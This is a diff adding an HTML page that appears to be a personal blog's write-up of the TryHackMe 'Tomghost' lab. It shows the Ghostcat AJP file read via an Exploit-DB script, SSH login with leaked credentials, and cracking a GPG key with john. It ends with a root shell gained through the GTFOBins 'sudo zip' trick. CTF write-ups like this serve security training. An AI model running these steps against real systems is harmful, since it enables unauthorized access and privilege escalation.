@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+     <meta charset="utf-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>0xb0tm4n&#x27;s website</title>
+     <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js" integrity="sha256-WCzAhd2P6gRJF9Hv3oOOd+hFJi/QJbv+Azn4CGB8gfY=" crossorigin="anonymous"></script>
+     <script src="/js/index.js"></script>
+     <script src="/js/prompt.js"></script>
+     <script src="/js/keyboard.js"></script>
+     <script src="/js/tab.js"></script>
+     <script src="/js/commands.js"></script>
+     <script src="/js/config.js"></script><script src="&#x2F;js&#x2F;custom_script.js"></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="&#x2F;css&#x2F;intro.css"><link rel="stylesheet" href="/css/page.css"></head>
+<body onkeydown='exec(event)'>
+  <header>
+      <h1>0xb0tm4n&#x27;s website</h1>
+  </header>
+  <main>
+    <div class="files" id="files" tabindex="0">
+<ul><li class="file">
+    <span><a href='https://super-botman.github.io/readme/'
+      tabindex="-2">  README</a></span>
+  </li><li class="folder"><span>
+      
+      <a href='https://super-botman.github.io/pwn/'
+        tabindex="-3">  Pwn
+      </a>
+    </span>
+
+    <ul>
+      
+        
+        
+          
+          
+<li>
+<span>└──
+  
+  <a href='https://super-botman.github.io/pwn/writeups/'
+    tabindex="-4">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/aarchibald/'
+        tabindex="-5">  Hackropole | Aarchibald</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/alfred/'
+        tabindex="-6">  Hackropole | Alfred</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/armigo/'
+        tabindex="-7">  Hackropole | Armigo</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/pwn103/'
+        tabindex="-8">  THM | pwn101 task 103</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/robot/'
+        tabindex="-9">  FCSC 2023 | Robot</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li><li class="folder"><span>
+      
+      <a href='https://super-botman.github.io/web/'
+        tabindex="-10">  Web
+      </a>
+    </span>
+
+    <ul>
+      
+        
+        
+          
+          
+<li>
+<span>└──
+  
+  <a href='https://super-botman.github.io/web/writeups/'
+    tabindex="-11">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+  <li class="file">
+    <span>└──
+      <a class="selected"href='https://super-botman.github.io/web/writeups/thomghost/'
+        tabindex="-12">  THM | Thomghost</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/boiler/'
+        tabindex="-13">  THM | Boiler</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li>
+</ul>
+</div>
+    <div class="viewer page" id="viewer" tabindex="0">
+      <div class="tab">
+<ul id="tabs">
+</ul>
+
+
+</div>
+      <div class="content" id="content"><h1 id="thm-thomghost-writeup">THM Thomghost writeup</h1>
+<h2 id="8009-tomcat">8009 : tomcat</h2>
+<p>use exploit <code>48143.py</code> from <a href="https://exploit-db.com">exploit db</a> and get :</p>
+<pre data-lang="xml" style="background-color:#212733;color:#ccc9c2;" class="language-xml "><code class="language-xml" data-lang="xml"><span>Getting resource at ajp13://10.10.228.43:8009/asdf
+</span><span>----------------------------
+</span><span style="color:#5ccfe690;">&lt;?</span><span style="color:#73d0ff;">xml </span><span style="color:#ffd580;">version</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;1.0&quot; </span><span style="color:#ffd580;">encoding</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;UTF-8&quot;</span><span style="color:#5ccfe690;">?&gt;
+</span><span style="font-style:italic;color:#5c6773;">&lt;!--
+</span><span style="font-style:italic;color:#5c6773;"> Licensed to the Apache Software Foundation (ASF) under one or more
+</span><span style="font-style:italic;color:#5c6773;">  contributor license agreements.  See the NOTICE file distributed with
+</span><span style="font-style:italic;color:#5c6773;">  this work for additional information regarding copyright ownership.
+</span><span style="font-style:italic;color:#5c6773;">  The ASF licenses this file to You under the Apache License, Version 2.0
+</span><span style="font-style:italic;color:#5c6773;">  (the &quot;License&quot;); you may not use this file except in compliance with
+</span><span style="font-style:italic;color:#5c6773;">  the License.  You may obtain a copy of the License at
+</span><span style="font-style:italic;color:#5c6773;">
+</span><span style="font-style:italic;color:#5c6773;">      http://www.apache.org/licenses/LICENSE-2.0
+</span><span style="font-style:italic;color:#5c6773;">
+</span><span style="font-style:italic;color:#5c6773;">  Unless required by applicable law or agreed to in writing, software
+</span><span style="font-style:italic;color:#5c6773;">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
+</span><span style="font-style:italic;color:#5c6773;">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+</span><span style="font-style:italic;color:#5c6773;">  See the License for the specific language governing permissions and
+</span><span style="font-style:italic;color:#5c6773;">  limitations under the License.
+</span><span style="font-style:italic;color:#5c6773;">--&gt;
+</span><span style="color:#5ccfe690;">&lt;</span><span style="color:#73d0ff;">web-app </span><span style="color:#ffd580;">xmlns</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
+</span><span>  </span><span style="color:#ffd580;">xmlns</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffd580;">xsi</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+</span><span>  </span><span style="color:#ffd580;">xsi</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffd580;">schemaLocation</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;http://xmlns.jcp.org/xml/ns/javaee
+</span><span style="color:#bae67e;">                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
+</span><span>  </span><span style="color:#ffd580;">version</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;4.0&quot;
+</span><span>  </span><span style="color:#ffd580;">metadata-complete</span><span style="color:#ccc9c2cc;">=</span><span style="color:#bae67e;">&quot;true&quot;</span><span style="color:#5ccfe690;">&gt;
+</span><span>
+</span><span>  </span><span style="color:#5ccfe690;">&lt;</span><span style="color:#73d0ff;">display-name</span><span style="color:#5ccfe690;">&gt;</span><span>Welcome to Tomcat</span><span style="color:#5ccfe690;">&lt;/</span><span style="color:#73d0ff;">display-name</span><span style="color:#5ccfe690;">&gt;
+</span><span>  </span><span style="color:#5ccfe690;">&lt;</span><span style="color:#73d0ff;">description</span><span style="color:#5ccfe690;">&gt;
+</span><span>     Welcome to GhostCat
+</span><span>	   skyfuck:passwd
+</span><span>  </span><span style="color:#5ccfe690;">&lt;/</span><span style="color:#73d0ff;">description</span><span style="color:#5ccfe690;">&gt;
+</span><span>
+</span><span style="color:#5ccfe690;">&lt;/</span><span style="color:#73d0ff;">web-app</span><span style="color:#5ccfe690;">&gt;
+</span></code></pre>
+<h2 id="22-ssh">22 : ssh</h2>
+<p>login using creds <code>ssh skyfuck@$IP</code> then it's the <code>privesc</code> parts :</p>
+<h3 id="privesc">privesc:</h3>
+<p>find two files : <code>credential.gpg</code> and <code>tryhackme.asc</code> then use john for decrypt the password of the gpg key :</p>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffd580;">gpg2john</span><span> tryhackme.asc </span><span style="color:#f29e74;">&gt;</span><span> key.hash
+</span><span style="color:#ffd580;">john</span><span style="color:#ffcc66;"> -wordlist</span><span style="color:#f29e74;">=</span><span>/usr/share/wordlists/rockyou.txt key.hash
+</span></code></pre>
+<p>the use gpg to decrypt the file <code>credential.gpg</code> :</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>┌──(ismael㉿kali)-[~/Documents/CTF/THM/tomghost]
+</span><span>└─$ gpg --import private.key       
+</span><span>gpg: clef 8F3DA3DEC6707170 : « tryhackme &lt;stuxnet@tryhackme.com&gt; » n&#39;est pas modifiée
+</span><span>gpg: clef 8F3DA3DEC6707170 : clef secrète importée
+</span><span>gpg: clef 8F3DA3DEC6707170 : « tryhackme &lt;stuxnet@tryhackme.com&gt; » n&#39;est pas modifiée
+</span><span>gpg:       Quantité totale traitée : 2
+</span><span>gpg:                 non modifiées : 2
+</span><span>gpg:           clefs secrètes lues : 1
+</span><span>gpg:      clefs secrètes importées : 1
+</span><span>                                                                                                                                                                        
+</span><span>┌──(ismael㉿kali)-[~/Documents/CTF/THM/tomghost]
+</span><span>└─$ gpg --decrypt credential.pgp
+</span><span>gpg: Attention : l&#39;algorithme de chiffrement CAST5 est introuvable
+</span><span>            dans les préférences du destinataire
+</span><span>gpg: chiffré avec une clef ELG de 1024 bits, identifiant 61E104A66184FBCC, créée le 2020-03-11
+</span><span>      « tryhackme &lt;stuxnet@tryhackme.com&gt; »
+</span><span>merlin:&lt;passwd&gt;
+</span></code></pre>
+<p>and login to ssh:</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>┌──(ismael㉿kali)-[~/Documents/CTF/THM/tomghost]
+</span><span>└─$ ssh merlin@10.10.126.249
+</span><span>merlin@10.10.126.249&#39;s password: 
+</span><span>Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)
+</span><span>
+</span><span> * Documentation:  https://help.ubuntu.com
+</span><span> * Management:     https://landscape.canonical.com
+</span><span> * Support:        https://ubuntu.com/advantage
+</span><span>
+</span><span>Last login: Sat Aug  6 06:52:00 2022 from 10.9.2.76
+</span><span>merlin@ubuntu:~$ cat flag.txt
+</span><span>&lt;flag&gt;
+</span></code></pre>
+<p>so now it's privesc time !</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>merlin@ubuntu:~$ id
+</span><span>uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+</span><span>merlin@ubuntu:~$ sudo -l
+</span><span>Matching Defaults entries for merlin on ubuntu:
+</span><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span><span>
+</span><span>User merlin may run the following commands on ubuntu:
+</span><span>    (root : root) NOPASSWD: /usr/bin/zip
+</span></code></pre>
+<p>go to <a href="https://gtfobins.github.io/gtfobins/">GTFOBins</a> and search zip : <a href="https://gtfobins.github.io/gtfobins/zip/#sudo">zip#sudo</a></p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>merlin@ubuntu:~$ TF=$(mktemp -u)
+</span><span>merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT &#39;sh #&#39;
+</span><span>  adding: etc/hosts (deflated 31%)
+</span><span># id
+</span><span>uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre>
+<p>and get the second flag:</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span># cd /root
+</span><span># ls
+</span><span>root.txt  ufw
+</span><span># cat root.txt
+</span><span>&lt;flag&gt;
+</span></code></pre>
+
+      </div>
+    </div>
+    <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+  </main>
+</body>
+</html>
